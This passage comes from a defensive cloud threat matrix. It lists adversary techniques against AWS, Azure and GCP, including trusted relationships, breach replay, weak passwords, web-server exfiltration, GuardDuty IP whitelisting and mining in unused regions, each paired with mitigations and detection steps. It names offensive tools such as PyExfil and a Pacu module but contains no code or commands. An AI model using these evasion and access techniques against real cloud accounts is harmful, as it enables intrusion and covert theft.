| Enable CloudTrail across all regions in AWS | To enable CloudTrail across all regions: 1.Sign into the AWS Management Console and open the CloudTrail console 2.Click on*Trails* 3.Set necessary Trails to All option in the I column 4.Click on a trail via the link*Name*column 5.Set*Logging*to*ON* 6.Set*Apply trail to all regions*to*Yes* |
| Configure log profile to capture activity logs for all regions in Azure | To set up activity logs for all regions: 1.Navigate to Azure console 2.Go to*Activity log* 3.Select*Export* 4.Select*Subscription* 5.Check*Select all*in*Regions* 6.Select*Save* |


References


1.https://www.justice.gov/file/1080281/download. Accessed July 3, 2020.


# Trusted Relationship(version 1.0)


**Cloud Service Label: IaaS ,PaaS, SaaS**


Description


Adversaries may breach or otherwise leverage organizations and systems that have access to targeted cloud assets. Access through a trusted relationship exploits an existing connection that may not be protected or receives less scrutiny than standard mechanisms of gaining access to a network. These connections include on-premise assets and logically separate cloud assets that afford special access to a customer’s cloud resources. Organizations often grant elevated access to on-premise systems and third party external providers including SaaS providers in order to allow them to manage cloud assets or share information. Some examples of these relationships include IT services contractors, managed security providers, and infrastructure contractors. Azure permits the creation of guest accounts to allow external organizations to access certain resources. These accounts probably will not be automatically culled from the system if the user leaves the guest organization as would likely happen in the host organization. This could result in accesses being permitted for unauthorized persons.


Examples




| **Name** | **Description** |
| --- | --- |
| Co-Residence Identification and Information Leakage | As pointed out in a research paper written by the University of California San Diego and the Massachusetts Institute of Technology, co-residence is the process of identifying cloud instances that share the same underlying physical infrastructure, despite being separated virtually. Cloud users trust the cloud provider to ensure separation between different customers, however it is possible for a motivated customer to theoretically ensure co-residence with another customer on the same physical cloud host. Once virtual machine co-residence has been established, it might be possible to infer keys or other access credentials from co-resident machines leveraging their shared cache. |


Mitigations




| **Mitigation** | | **Description** |
| --- | --- | --- |
| Audit for unusual activities that might be related to this activity | | Guest accounts should be audited more frequently to ensure external relationships are still valid. |
|  | AWS | To perform an audit via AWS it is suggested to review information such as account details (credentials, users, groups, roles, etc), mobile applications, EC2 configurations, policies, and account activity. How to audit these different factors can be found in detail at:**https://docs.aws.amazon.com/general/latest/gr/aws-security-audit-guide.html.** |
|  | Azure | To perform an audit via Azure an administrator can review the audit logs that are recorded under Azure’s monitoring for active directory. The audit logs allow for filtering, as well as looking at users, groups, and enterprise specific information. Full details on how to access this information can be found at:**https://docs.microsoft.com/en-us/azure/active-directory/reports-monitoring/concept-audit-logs.** |
|  | GCP | To perform an audit via GCP the logs can be reviewed. GCP breaks this down into three categories; admin activity, data access, and system events. The audit logs can be viewed a few different ways- the console, API, or gcloud. Full details on how to view these logs, how to export, and for how to configure the retention period can be found here:**https://cloud.google.com/logging/docs/audit.** |
| Network Segmentation | | Network segmentation can be used to isolate IaaS components that do not require broad network access. |
| User Account Control | | Properly manage accounts and permissions used by parties in trusted relationships to minimize potential abuse by the party and if the party is compromised by an adversary. AWS and Azure can assign roles to its entities, which allows for strong IAM policies for various services like serverless functions, containers, or workloads. |
| Making Trust Determinations | | Trust determinations in Azure AD can be made through Hybrid Identity, Azure AD Connect, password hash synchronization, pass-through authentication, federation, and single sign-on. |
| Least Privilege | | All access given to users in the cloud environment should be assigned by the necessary privileges needed for team members to complete their job responsibilities. |
|  | *AWS* | To implement least privilege in an AWS environment IAM policies will be used. This gives the ability to allow users to perform list, read, write, permissions management, or tagging actions. AWS suggests utilizing*last accessed information*and A*WS CloudTrail event history*to get a better understanding of privileges that might be needed or reduced based on a specific role. Full details can be found at**https://docs.aws.amazon.com/IAM/latest/UserGuide/best-practices.html#grant-least-privilege.** |
|  | *Azure* | To implement least privilege in an Azure environment Azure Active Directory roles will be used. Azure outlines different tasks and the least privileged role that are suggested to be associated with the task. Those details can be found at:**https://docs.microsoft.com/en-us/azure/active-directory/users-groups-roles/roles-delegate-by-task.**To learn how to assign specific roles it can be done via the Azure Active Directory Portal. Instructions on how to assign roles can be found here:**https://docs.microsoft.com/en-us/azure/active-directory/users-groups-roles/directory-manage-roles-portal.** |
|  | *GCP* | To implement least privilege in GCP it is recommended to use predefined roles (which allow for granular access permissions) instead of primitive roles (roles/owner, roles/editor, and roles/viewer). Full details on the difference between types of roles can be found here:**https://cloud.google.com/iam/docs/understanding-roles.**To assign these roles IAM service accounts are used and complete details can be found at:**https://cloud.google.com/iam/docs/using-iam-securely#least\_privilege.** |


Detection




| **Mitigation** | | **Description** |
| --- | --- | --- |
| Monitoring | | Establish monitoring for activity conducted by second and third party providers and other trusted entities that may be leveraged as a means to gain access to the network. Depending on the type of relationship, an adversary may have access to significant amounts of information about the target before conducting an operation, especially if the trusted relationship is based on IT services. Adversaries may be able to act quickly towards an objective, so proper monitoring for behavior related to Credential Access, Lateral Movement, and Collection will be important to detect the intrusion. |
|  | AWS | Various services in AWS offer logging features that allow for detection capabilities. These include CloudFront, CloudTrail, CloudWatch, Config, and S3. To create a metric filter and alarm: 1.Create a metric filter that checks for IAM policy changes and the*<cloudtrail\_log\_group\_name>* 2.Create an SNS topic 3.Create an SNS subscription to the above topic 4.Create an alarm associated with the filter and SNS topic created in steps 1 and 2 respectively |
|  | Azure | Azure AD can generate anomaly reports than can be run on a daily basis. Azure AD Identity Protection show current risks in its dashboard and provides daily email summary notifications. Policies can also be configured to alert to specific issues. To create a log alert in the Azure portal: 1.Select**Monitor -> Alerts** 2.Select**New alert rule**of the**Alerts**window 3.Provide information in**Define alert condition** 4.Provide details in**Define alert details** 5.Specify action group for new alert rule under**Action group**, or create a new action group with +**New group** 6.Select**Yes**for the**Enable rule upon creation**option 7.Select**Create alert rule** To view and manage alerts: 1.Select**Monitor -> Alerts -> Manage alert rules** 2.Select the rule you want to modify and double-click to edit the rule options 3.Click**Save** |
| CASB (Cloud Access Security Broker) | | Consider employing a CASB to monitor access between SaaS accounts and AWS/Azure resources. |


References


1.<https://sonraisecurity.com/education/aws-azure-google-cloud-security-iam/>. Accessed July 27, 2020.


2.<https://devblogs.microsoft.com/azuregov/implementing-zero-trust-with-microsoft-azure-identity-and-access-management-1-of-6/>. Accessed July 27, 2020.


3.https://cseweb.ucsd.edu/~savage/papers/CCS09.pdf. Accessed July 2, 2020.


4.Wait a minute! A fast, Cross-VM attack on AES Gorka Irazoqui, Mehmet Sinan Inci, Thomas Eisenbarth, and Berk Sunar Worcester Polytechnic Institute, Worcester, MA, USA – Accessed August 6,2020


# Unencrypted Network Traffic(version 1.0)


**Cloud Service Label: IaaS**


Description


Adversaries may be able to intercept network traffic. Some cloud services can utilize insecure comms that lead to plaintext information being transmitted. In some cases, the plaintext information being sent are credentials which may lead adversaries to gain access to specific cloud services, as well as, perform lateral movement.


Examples




| **Name** | **Description** |
| --- | --- |
| Jenkins Azure AD Plugin | This[CVE](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-2119)outlines a vulnerability in the Jenkins Azure AD Plugin 1.1.2 and earlier.The plain text credentials are transmitted as a global configuration form resulting in possible exposure via intercepted network traffic, browser extensions, and cross-site scripting vulnerabilities. |


Mitigations




| **Mitigation** | **Description** |
| --- | --- |
| VPN | Utilizing a VPN can mitigate the risk due to application data being unencrypted. |
| Managed Service within Cloud Environment | Use a managed service over custom uploaded services or code within a cloud environment. Cloud service providers automatically update and patch their managed services whereas a custom service would have to be manually monitored and patched. |


Detection


This can be detected by monitoring network traffic to check for plaintext credentials when implementing new services or upgrading current services. Adversaries can also be detected if monitoring for rouge connections on the network.


References


1.https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-2119. Accessed May 14, 2020.


2.<https://docs.aws.amazon.com/cli/latest/userguide/cli-security-enforcing-tls.html>. Accessed July 27, 2020.


# Unused (Unsupported) Cloud Regions(version 1.0)


**Cloud Service Label: IaaS**


Description


Adversaries may create cloud instances in unused geographic service regions in order to evade detection. Access is usually obtained through compromising accounts used to manage cloud infrastructure. Cloud service providers often provide infrastructure throughout the world in order to improve performance, provide redundancy, and allow customers to meet compliance requirements. Oftentimes, a customer will only use a subset of the available regions and may not actively monitor other regions. If an adversary creates resources in an unused region, they may be able to operate undetected.


A variation on this behavior takes advantage of differences in functionality across cloud regions. An adversary could utilize regions which do not support advanced detection services in order to avoid detection of their activity. For example, AWS GuardDuty is not supported in every region. An example of adversary use of unused AWS regions is to mine cryptocurrency through[Resource Hijacking](https://attack.mitre.org/techniques/T1496), which can cost organizations substantial amounts of money over time depending on the processing power used.


Examples




| **Name** | **Description** |
| --- | --- |
| CloudSploit | This blog post notes how they received an email about an ASW customer who had not deactivated unused regions and found there to be 50 EC2 instances running to mine Bitcoin 24/7. |


Mitigations




| **Mitigation** | **Description** |
| --- | --- |
| Software Configuration | Cloud service providers may allow customers to deactivate unused regions. |
| Monitor Unused Regions | Even if the region is unused, it should be set up to be monitored utilizing tools such as CloudTrail. |
| Deactivate Unused Region Endpoints | Disable user ability to generate STS credentials in unused regions. |
| Don’t Enable New Regions Unless Required | If a region is not enabled by default and when a malicious actor attempts to create new resource, they will be asked to first enabled the region. They will be unable to do so if they do not have administrator privileges or the correct IAM role. |


Detection




| **Detection** | **Description** |
| --- | --- |
| Enable CloudTrail across all regions in AWS | To enabled CloudTrail across all regions: 1.Sign into the AWS Management Console and open the CloudTrail console 2.Click on*Trails* 3.Set necessary Trails to All option in the I column 4.Click on a trail via the link*Name*column 5.Set*Logging*to*ON* 6.Set*Apply trail to all regions*to*Yes* |
| Configure log profile to capture activity logs for all regions in Azure | To set up activity logs for all regions: 1.Navigate to Azure console 2.Go to*Activity log* 3.Select*Export* 4.Select*Subscription* 5.Check*Select all*in*Regions* 6.Select*Save* |
| Monitoring for Regional Activity | Tools like Splunk or even CloudSploit have the ability to alert based on region and ingest CloudTrail logs. In CloudSploit, a plugin called EC2 Max Count can be configured to alert after a certain threshold of EC2 instances is met. Real-Time Events service is another feature of CloudSploit that allows alerts for activity in unused regions. |


References


1.https://blog.cloudsploit.com/the-danger-of-unused-aws-regions-af0bf1b878fc. Accessed July 1, 2020.


# Utilize Breach Replay(version 1.0)


**Cloud Service Label: IaaS, PaaS**


Description


Credentials for accessing Azure and AWS portals/API are often reused for other web-based accounts by both privileged Azure and AWS users. These other accounts may be compromised, and adversaries will as a matter of course attempt to use harvested credentials to access Cloud-based resources knowing the prevalence of password reuse.


Examples




| **Name** | **Description** |
| --- | --- |
| Harvesting of Common Passwords from Multiple Accounts | Microsoft recently has conducted an extensive study of credentials they have detected throughout all their platforms and found 44 million credentials shared between Azure and other unrelated accounts. |


Mitigations




| **Mitigation** | | **Description** |
| --- | --- | --- |
| Good Password Practices | | Ensure good password practices. Never use Azure and AWS passwords for any other cloud or computer access. |
|  | AWS | Good password practices can be enforced in AWS via the console, AWS CLI, and AWS API. These configurations are for IAM accounts only and have a range of different characteristics that can be enforced. For instance minimum password length, require a range of characters (lowercase, uppercase, number, and non alphanumeric ), allow users to change their own password, password expiration, prevent password reuse, and require administrator reset after password expiration. All details on how to configure these enforcement policies with all three management systems can be found here:**https://docs.aws.amazon.com/IAM/latest/UserGuide/id\_credentials\_passwords\_account-policy.html.** |
|  | Azure | Good password practices can be enforced in Azure only with managed domains created using the resource manager deployment. By default these accounts have some policies enforced including amount of lockout duration, allowed number of logon attempts,Reset failed logon attempts count after 30 minutes, and lifetime of password. Other policies that can be changed are minimum password length and the ability to enforce the concept of ‘passwords must meet complexity requirements’. These configurations can be accomplished by accessing the Active Directory Administrative Center under administrative tools, then editing the rules under the settings for the Password Settings Container. Full details on how to accomplish this can be found here:**https://docs.microsoft.com/en-us/azure/active-directory-domain-services/password-policy.** |
| Multi-Factor Authentication | | Use multi-factor authentication for user and privileged accounts. Do not manage Cloud portals from machines that perform user email and web browsing tasks. All users should be required to utilize two factor authentication. |
|  | AWS | This can be enforced by first creating a policy that would prohibit actions except those that allow a user to change their password or manage 2FA, then attaching a policy to a group that includes all user accounts where they can be allowed all access if they sign in with 2FA. Once these actions are completed it should be tested to verify the access is given correctly. To see full details on how to complete this view AWS documentation at:**https://docs.aws.amazon.com/IAM/latest/UserGuide/tutorial\_users-self-manage-mfa-and-creds.html.** |
|  | Azure | This can be done by creating a MFA registration policy. It can than be assigned to all users (with the ability to exclude some if need be, but is not recommended). Make sure once the policy is created and added to users that it is then being enforced, once enforced it should be tested for verification. To see full details on how to complete this view Azure documentation at:**https://docs.microsoft.com/en-us/azure/active-directory/identity-protection/howto-identity-protection-configure-mfa-policy.** |
|  | GCP | This can be done by first enabling it on the current account being used by admin to assign the roles, then enable two factor on an instance by instance or project by project basis, then assigning the requirements based on IAM roles and applying it to all users. To see full details on how to complete this view Azure documentation at:**https://cloud.google.com/compute/docs/oslogin/setup-two-factor-authentication.** |


Detection


In Azure all user logins are recorded under the Azure Active Directory Sign-ins blade. This information can also be downloaded to a central SIEM for correlation. Assess logins and their originating location against expected behavior. If in Azure a user has the P2 Active Directory licensing, Azure Identity protection may alert you to the presence of this attack based on Microsoft’s experience with other Microsoft customers.


References


1.https://www.microsoft.com/securityinsights/Identity. Accessed Feb 20, 2020


2.https://docs.microsoft.com/en-gb/azure/active-directory/identity-protection/overview-identity-protection. Accessed Feb 20, 2020


# Virtual Network Peering(version 1.0)


**Cloud Service Label: IaaS**


Description


Adversaries that have established a presence in one virtual network (VPC in AWS) will attempt to explore and access resources in other virtual networks owned by the same organization. By default, individual virtual networks have no routable paths between each other, so it is difficult to access one from another. Both Azure and AWS offer peering capabilities that enable virtual networks to communicate with each other seamlessly. Once peered, routing between the virtual networks is configured in the background and all resources in one virtual network are now reachable by default by the other.


Examples




| **Name** | **Description** |
| --- | --- |
|  |  |


Mitigations




| **Mitigation** | **Description** |
| --- | --- |
| Assigning Network Security Groups | In Azure assigning a Network Security Group (NSG) to subnets within a virtual network will protect all assets within the subnet from other virtual networks regardless of peering. |


Detection


NSG’s have netflow capture capabilities that can log all network connections that are attempted with a subnet. These logs can be saved to a storage account for analysis.


References


# Weak Passwords(version 1.0)


**Cloud Service Label: IaaS, PaaS, SaaS**


Description


Adversaries may be able to exploit weak passwords to gain initial access. When user accounts utilize weak, or reused passwords, it runs the risk of adversaries gaining access, once access is gained, they can continue on in their attack. The adversary may have the ability to change user credentials locking the user out, collect data, maintain persistence, escalate privileges, and move laterally. The level of access, and ability for adversary to complete these tasks, is dependent on the permissions the user of the exploited password holds.


Examples




| **Name** | **Description** |
| --- | --- |
| SYNACKTIV’s Azure AD Introduction to Red Teaming | This Introduction to Red Teaming outlines how an adversary can utilize weak passwords and harvested emails to gain initial access to a system. From there it is explained how an adversary may be able to move laterally and maintain persistence. |


Mitigations




| **Mitigation** | | **Description** |
| --- | --- | --- |
| [Account Segmentation](https://attack.mitre.org/mitigations/M1030) | | Consider separating different resources under different administrative domains so that credential compromise does not put all assets in danger. In the case of Azure, multiple subscriptions can be created with different administrators that can only access resources within the subscription. The subscriptions can still belong under the same Azure account for overall accounting and administration/policy. |
| [Multi-factor Authentication](https://attack.mitre.org/mitigations/M1032) | | Use multi-factor authentication for user and privileged accounts. Do not manage Cloud portals from machines that perform user email and web browsing tasks. All users should be required to utilize two factor authentication. |
|  | AWS | This can be enforced by first creating a policy that would prohibit actions except those that allow a user to change their password or manage 2FA, then attaching a policy to a group that includes all user accounts where they can be allowed all access if they sign in with 2FA. Once these actions are completed it should be tested to verify the access is given correctly. To see full details on how to complete this view AWS documentation at:**https://docs.aws.amazon.com/IAM/latest/UserGuide/tutorial\_users-self-manage-mfa-and-creds.html.** |
|  | Azure | This can be done by creating a MFA registration policy. It can than be assigned to all users (with the ability to exclude some if need be, but is not recommended). Make sure once the policy is created and added to users that it is then being enforced, once enforced it should be tested for verification. To see full details on how to complete this view Azure documentation at:**https://docs.microsoft.com/en-us/azure/active-directory/identity-protection/howto-identity-protection-configure-mfa-policy.** |
|  | GCP | This can be done by first enabling it on the current account being used by admin to assign the roles, then enable two factor on an instance by instance or project by project basis, then assigning the requirements based on IAM roles and applying it to all users. To see full details on how to complete this view Azure documentation at:**https://cloud.google.com/compute/docs/oslogin/setup-two-factor-authentication.** |
| [Privileged Account Management](https://attack.mitre.org/mitigations/M1026) | | Do not allow subscription-level administrator accounts to be used for day-to-day operations that may expose them to potential adversaries on unprivileged systems. |
|  | AWS | To manage the access that privileged accounts have on the AWS cloud system to only allow administrators to perform administrative tasks on such accounts can be accomplished utilizing limited IAM administrator accounts. To configure this the administrator would have two accounts; one would have administrative rights and no basic access while the other account has basic access with no administrative rights. To limit the administrative account the IAM limited administrator would be used. This is done by creating a policy that gives a user admin rights, but disallows the other actions using the AWS command line interface. This is outlined at:[**https://aws.amazon.com/blogs/security/how-to-create-a-limited-iam-administrator-by-using-managed-policies/**](https://aws.amazon.com/blogs/security/how-to-create-a-limited-iam-administrator-by-using-managed-policies/)**.** |
|  | Azure | To manage the access that privilege accounts have on the Azure cloud system to only allow administrators to perform administrative tasks on such accounts can be accomplished utilizing limited IAM administrator accounts. To configure this the administrator would have two accounts; one would have administrative rights and no basic access while the other account has basic access with no administrative rights. To limit the administrative account the specific administrative needs can be picked from a number of options available (Azure DevOps Administrator, Billing Administrator, Cloud Application Administrator, etc.) These different options can be edited to fit the needs and limit the basic access. This is outlined at:[**https://docs.microsoft.com/en-us/azure/active-directory/users-groups-roles/directory-assign-admin-roles**](https://docs.microsoft.com/en-us/azure/active-directory/users-groups-roles/directory-assign-admin-roles)**.** |
|  | GCP | To manage the access that privilege accounts have on the Azure cloud system to only allow administrators to perform administrative tasks on such accounts can be accomplished utilizing limited IAM administrator accounts. To configure this the administrator would have two accounts; one would have administrative rights and no basic access while the other account has basic access with no administrative rights. To limit the administrative account pre-defined administrator accounts can be used (mobile admin, Google voice admin, help desk admin, etc.). These accounts can be used with their pre-defined settings, or modified depending on specific use cases. These can limit access to basic functionality needed. This is outlined at:[**https://support.google.com/a/answer/2405986?hl=en**](https://support.google.com/a/answer/2405986?hl=en)**.** |
| Strong Password Policies | | Strong password policies in place, as well as training, so users are aware passwords should not be reused from previous accounts. |
|  | AWS | Good password practices can be enforced in AWS via the console, AWS CLI, and AWS API. These configurations are for IAM accounts only and have a range of different characteristics that can be enforced. For instance minimum password length, require a range of characters (lowercase, uppercase, number, and non alphanumeric ), allow users to change their own password, password expiration, prevent password reuse, and require administrator reset after password expiration. All details on how to configure these enforcement policies with all three management systems can be found here:**https://docs.aws.amazon.com/IAM/latest/UserGuide/id\_credentials\_passwords\_account-policy.html.** |
|  | Azure | Good password practices can be enforced in Azure only with managed domains created using the resource manager deployment. By default these accounts have some policies enforced including amount of lockout duration, allowed number of logon attempts,Reset failed logon attempts count after 30 minutes, and lifetime of password. Other policies that can be changed are minimum password length and the ability to enforce the concept of ‘passwords must meet complexity requirements’. These configurations can be accomplished by accessing the Active Directory Administrative Center under administrative tools, then editing the rules under the settings for the Password Settings Container. Full details on how to accomplish this can be found here:**https://docs.microsoft.com/en-us/azure/active-directory-domain-services/password-policy.** |


Detection


Collect events that correlate with changes to account objects on systems and the domain, such as event ID 4738. Monitor for modification of accounts in correlation with other suspicious activity. Changes may occur at unusual times or from unusual systems. Especially flag events where the subject and target accounts differ or that include additional flags such as changing a password.


Use of credentials may also occur at unusual times or to unusual systems or services and may correlate with other suspicious activity. Azure displays all sign-ins to AD under the Active Directory blade.


References


1.https://www.synacktiv.com/posts/pentest/azure-ad-introduction-for-red-teamers.html. Accessed May 14, 2020.


# Exfiltrating Using Web Servers(version 1.0)


**Cloud Service Label: IaaS, PaaS**


Description


Many customer cloud deployments incorporate a public web server to serve external entities with content. Adversaries that have gained access to a customer’s cloud assets and have already located and collected data for exfiltration can use such web servers as a stealthy way of exfiltrating data. An adversary knows that cloud firewalls and monitoring products are configured to expect and allow data to be served by public web servers. There are public exfiltration tools that make public web servers in a cloud especially convenient for an adversary to utilize for exfiltration.


Examples




| **Name** | **Description** |
| --- | --- |
| PyExfil | Publicly available tool set to leverage web servers and other adversary controlled assets to stealthily exfiltrate data from compromised accounts. |


Mitigations




| **Mitigation** | | **Description** |
| --- | --- | --- |
| Audit | | Frequently check permissions on cloud storage to ensure proper permissions are set to deny open or unprivileged access to resources. Consider using automated resource checkers such as CloudSploit or Divvycloud.Frequently check accesses to web servers for content that has not been downloaded before. |
|  | AWS | To perform an audit via AWS it is suggested to review information such as account details (credentials, users, groups, roles, etc), mobile applications, EC2 configurations, policies, and account activity. How to audit these different factors can be found in detail at:**https://docs.aws.amazon.com/general/latest/gr/aws-security-audit-guide.html.** |
|  | Azure | To perform an audit via Azure an administrator can review the audit logs that are recorded under Azure’s monitoring for active directory. The audit logs allow for filtering, as well as looking at users, groups, and enterprise specific information. Full details on how to access this information can be found at:**https://docs.microsoft.com/en-us/azure/active-directory/reports-monitoring/concept-audit-logs.** |
|  | GCP | To perform an audit via GCP the logs can be reviewed. GCP breaks this down into three categories; admin activity, data access, and system events. The audit logs can be viewed a few different ways- the console, API, or gcloud. Full details on how to view these logs, how to export, and for how to configure the retention period can be found here:**https://cloud.google.com/logging/docs/audit.** |
| Task Definition Edit Privileges | | If it is necessary to have a task definition run a role that requires an elevated level of permission, ensure that that task definition cannot be altered by everyone. |


Detection




| **Detection** | **Description** |
| --- | --- |
| Create Log Metric Filters and Alarms for AWS | To create a metric filter and alarm: 1.Create a metric filter that checks for IAM policy changes and the*<cloudtrail\_log\_group\_name>* 2.Create an SNS topic 3.Create an SNS subscription to the above topic 4.Create an alarm associated with the filter and SNS topic created in steps 1 and 2 respectively |
| Monitor Activity in AWS Account | Various services in AWS offer logging features that allow for detection capabilities. These include CloudFront, CloudTrail, CloudWatch, Config, and S3. |
| Monitor for Suspicious Activity in Azure | Azure AD can generate anomaly reports than can be run on a daily basis. Azure AD Identity Protection show current risks in its dashboard and provides daily email summary notifications. Policies can also be configured to alert to specific issues. |
| Create Log Metric Filters and Alarms for CloudTrail | To create a metric filter and alarm: 1.Create a filter that checks for CloudTrail changes and the specific*<cloudtrail\_log\_group\_name>* 2.Create an SNS topic that the alarm will notify 3.Create an SNS subscription to the above topic 4.Create an alarm associated with the filter from step 1 and SNS topic in step 2 |
| Create Activity Log Alerts in Azure | To create log activity alerts for deletion in the Azure Console: 1.Navigate to*Monitor’ / ‘Alerts* 2.Select*Manage alert rules* 3.Click on the Alert*Name*where Condition contains*operationName equals Microsoft.Network/networkSecurityGroups/securityRules/delete* 4.Hover a mouse over*Condition*to ensure it is set to*Whenever the Administrative Activity Log “Delete Security Rule (networkSecurityGroups/securityRules)” has “any” level with “any” status and event is initiated by “any*” |
| Create, View, and Manage Activity Alerts in Azure Monitor | To create a log alert in the Azure portal: 1.Select**Monitor -> Alerts** 2.Select**New alert rule**of the**Alerts**window 3.Provide information in**Define alert condition** 4.Provide details in**Define alert details** 5.Specify action group for new alert rule under**Action group**, or create a new action group with +**New group** 6.Select**Yes**for the**Enable rule upon creation**option 7.Select**Create alert rule** To view and manage alerts: 1.Select**Monitor -> Alerts -> Manage alert rules** 2.Select the rule you want to modify and double-click to edit the rule options 3.Click**Save** |
| Azure Resource Manager Templates | Azure Resource Manager templates in the format of JSON files that can be used to configure metric alerts in Azure Monitor. These templates can be used for simple static and dynamic threshold metric alerts, availability tests, and monitoring multiple resources. |
| Enable CloudTrail across all regions in AWS | To enable CloudTrail across all regions: 1.Sign into the AWS Management Console and open the CloudTrail console 2.Click on*Trails* 3.Set necessary Trails to All option in the I column 4.Click on a trail via the link*Name*column 5.Set*Logging*to*ON* 6.Set*Apply trail to all regions*to*Yes* |
| Configure log profile to capture activity logs for all regions in Azure | To set up activity logs for all regions: 1.Navigate to Azure console 2.Go to*Activity log* 3.Select*Export* 4.Select*Subscription* 5.Check*Select all*in*Regions* 6.Select*Save* |


References


1.https://github.com/ytisf/PyExfil/blob/master/USAGE.md#https-replace-certificate. Accessed March 8, 2020


# White Listing(version 1.0)


**Cloud Service Label: IaaS, PaaS**


Description


Both Azure and AWS employ security services that enable the inclusion of IP addresses that should be permitted through firewalls or should be ignored by services such as AWS Guard Duty. An adversary can add a simple IP address rule that likely will be missed by security personnel and will effectively negate the effectiveness of future security controls.


Examples




| **Name** | **Description** |
| --- | --- |
| guardduty\_whitelist\_ip (Pacu Module) | Publicly available Pacu module that inserts trusted IP addresses within the Guard Duty service effectively causing Guard Duty to ignore all traffic involving these IPs. |


Mitigations




| **Mitigation** | | **Description** |
| --- | --- | --- |
| Audit | | Frequently check permissions on cloud storage to ensure proper permissions are set to deny open or unprivileged access to resources. Consider using automated resource checkers such as CloudSploit or Divvycloud.Frequently check changes to the configurations of cloud detection services, firewalls and security groups. |
|  | AWS | To perform an audit via AWS it is suggested to review information such as account details (credentials, users, groups, roles, etc), mobile applications, EC2 configurations, policies, and account activity. How to audit these different factors can be found in detail at:**https://docs.aws.amazon.com/general/latest/gr/aws-security-audit-guide.html.** |
|  | Azure | To perform an audit via Azure an administrator can review the audit logs that are recorded under Azure’s monitoring for active directory. The audit logs allow for filtering, as well as looking at users, groups, and enterprise specific information. Full details on how to access this information can be found at:**https://docs.microsoft.com/en-us/azure/active-directory/reports-monitoring/concept-audit-logs.** |
|  | GCP | To perform an audit via GCP the logs can be reviewed. GCP breaks this down into three categories; admin activity, data access, and system events. The audit logs can be viewed a few different ways- the console, API, or gcloud. Full details on how to view these logs, how to export, and for how to configure the retention period can be found here:**https://cloud.google.com/logging/docs/audit.** |


Detection




| **Detection** | **Description** |
| --- | --- |
| Create Log Metric Filters and Alarms for AWS | To create a metric filter and alarm: 1.Create a metric filter that checks for IAM policy changes and the*<cloudtrail\_log\_group\_name>* 2.Create an SNS topic 3.Create an SNS subscription to the above topic 4.Create an alarm associated with the filter and SNS topic created in steps 1 and 2 respectively |
| Monitor Activity in AWS Account | Various services in AWS offer logging features that allow for detection capabilities. These include CloudFront, CloudTrail, CloudWatch, Config, and S3. |
| Monitor for Suspicious Activity in Azure | Azure AD can generate anomaly reports than can be run on a daily basis. Azure AD Identity Protection show current risks in its dashboard and provides daily email summary notifications. Policies can also be configured to alert to specific issues. |
| Create Log Metric Filters and Alarms for CloudTrail | To create a metric filter and alarm: 1.Create a filter that checks for CloudTrail changes and the specific*<cloudtrail\_log\_group\_name>* 2.Create an SNS topic that the alarm will notify 3.Create an SNS subscription to the above topic 4.Create an alarm associated with the filter from step 1 and SNS topic in step 2 |
| Create Activity Log Alerts in Azure | To create log activity alerts for deletion in the Azure Console: 1.Navigate to*Monitor’ / ‘Alerts* 2.Select*Manage alert rules* 3.Click on the Alert*Name*where Condition contains*operationName equals Microsoft.Network/networkSecurityGroups/securityRules/delete* 4.Hover a mouse over*Condition*to ensure it is set to*Whenever the Administrative Activity Log “Delete Security Rule (networkSecurityGroups/securityRules)” has “any” level with “any” status and event is initiated by “any*” |
| Create, View, and Manage Activity Alerts in Azure Monitor | To create a log alert in the Azure portal: 1.Select**Monitor -> Alerts** 2.Select**New alert rule**of the**Alerts**window 3.Provide information in**Define alert condition** 4.Provide details in**Define alert details** 5.Specify action group for new alert rule under**Action group**, or create a new action group with +**New group** 6.Select**Yes**for the**Enable rule upon creation**option 7.Select**Create alert rule** To view and manage alerts: 1.Select**Monitor -> Alerts -> Manage alert rules** 2.Select the rule you want to modify and double-click to edit the rule options 3.Click**Save** |
| Azure Resource Manager Templates | Azure Resource Manager templates in the format of JSON files that can be used to configure metric alerts in Azure Monitor. These templates can be used for simple static and dynamic threshold metric alerts, availability tests, and monitoring multiple resources. |
| Enable CloudTrail across all regions in AWS | To enable CloudTrail across all regions: 1.Sign into the AWS Management Console and open the CloudTrail console 2.Click on*Trails* 3.Set necessary Trails to All option in the I column 4.Click on a trail via the link*Name*column 5.Set*Logging*to*ON* 6.Set*Apply trail to all regions*to*Yes* |
| Configure log profile to capture activity logs for all regions in Azure | To set up activity logs for all regions: 1.Navigate to Azure console 2.Go to*Activity log* 3.Select*Export* 4.Select*Subscription* 5.Check*Select all*in*Regions* 6.Select*Save* |


References


1.https://github.com/RhinoSecurityLabs/pacu/wiki/Module-Details. Accessed Feb 12, 2020.


